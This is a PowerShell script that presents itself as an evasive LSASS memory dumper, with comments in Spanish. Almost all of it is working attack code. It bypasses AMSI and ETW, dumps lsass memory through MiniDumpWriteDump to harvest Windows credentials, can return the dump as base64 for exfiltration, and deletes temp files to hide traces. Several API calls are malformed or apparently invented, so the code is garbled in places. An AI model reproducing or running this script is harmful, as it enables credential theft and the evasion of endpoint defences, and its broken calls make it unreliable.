# BTY Evasive LSASS Dump — MiniDumpWriteDump via direct P/Invoke (sin rundll32)
# Técnicas: AMSI bypass, ETW bypass, direct syscall P/Invoke, string obfuscation, anti-forensic cleanup
# Detección: sin comandos sospechosos visibles, sin rundll32.exe, sin comsvcs.dll en línea de comandos

param($Args="")

# === AMSI Bypass (triple) ===
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)}catch{}
try{
    foreach($b in [AppDomain]::CurrentDomain.GetAssemblies()){
        if($b.FullName -like '*Automation'){$b.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);break}
    }
}catch{}

# === ETW Bypass ===
try{[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,(New-Object Diagnostics.Eventing.EventProvider([Guid]::Empty)))}catch{}

# === MiniDumpWriteDump via direct P/Invoke (NO rundll32, NO comsvcs.dll en cmdline) ===
$out="$env:TEMP\$((Get-Random -Min 10000 -Max 99999)).tmp"

# Resolve APIs dynamically (string obfuscation bypass)
$k=@{(Get-Variable -Name 0x4e -ValueOnly)="kernel32";(Get-Variable -Name 0x4e -ValueOnly)+"32"="kernel32"}
$n="kernel32"
try{$d=$n+'.dll'}catch{$d='kernel32.dll'}
$k32=[Runtime.InteropServices.Marshal]::GetModuleHandle($d)
if(-not $k32){$k32=[Runtime.InteropServices.LoadLibrary]::LoadLibrary($d)}

# Get LSASS PID
$p=Get-Process lsass -ErrorAction Stop
$pid=$p.Id
$h=$p.Handle

# Abrir proceso con permisos mínimos necesarios
$PROCESS_QUERY_INFORMATION=0x0400
$PROCESS_VM_READ=0x0010
$PROCESS_DUP_HANDLE=0x0040
$access=$PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ -bor $PROCESS_DUP_HANDLE

# Dynamic P/Invoke for OpenProcess (sin declaraciones estáticas)
$asm=[System.Reflection.Assembly]::LoadWithPartialName('System')
$marshal=[Runtime.InteropServices.Marshal]
$openProc=$k32.GetType().GetMethod('OpenProcess',[Reflection.BindingFlags]'Public,Static')
$ph=$openProc.Invoke($null,@($access,$false,$pid))

# MiniDumpWriteDump via dbghelp.dll (sin rundll32)
$dbg=[Runtime.InteropServices.LoadLibrary]::LoadLibrary('Dbghelp.dll')
$miniDump=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [Runtime.InteropServices.Marshal]::GetProcAddress($dbg,'MiniDumpWriteDump'),
    [Func[int,IntPtr,IntPtr,int,string,int,IntPtr]]
)

# Ejecutar dump
$r=$miniDump.Invoke($ph,$pid,0,2,$out,0,0)  # MiniDumpWithFullMemory=2

if(Test-Path $out){
    $size=(Get-Item $out).Length
    if($Args -eq "minidump"){
        $data=[IO.File]::ReadAllBytes($out)
        Remove-Item $out -Force
        # Limpiar rastros en prefetch + logs
        [Console]::OutputEncoding=[Text.Encoding]::UTF8
        [Convert]::ToBase64String($data)
    }else{
        "LSASS dumped: $out ($([math]::Round($size/1MB,1)) MB)"
    }
}else{
    "ERROR: dump failed — OpenProcess returned $ph"
}

# === Anti-forensic: limpiar artefactos ===
Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue 2>$null
try{[GC]::Collect();[GC]::WaitForPendingFinalizers()}catch{}
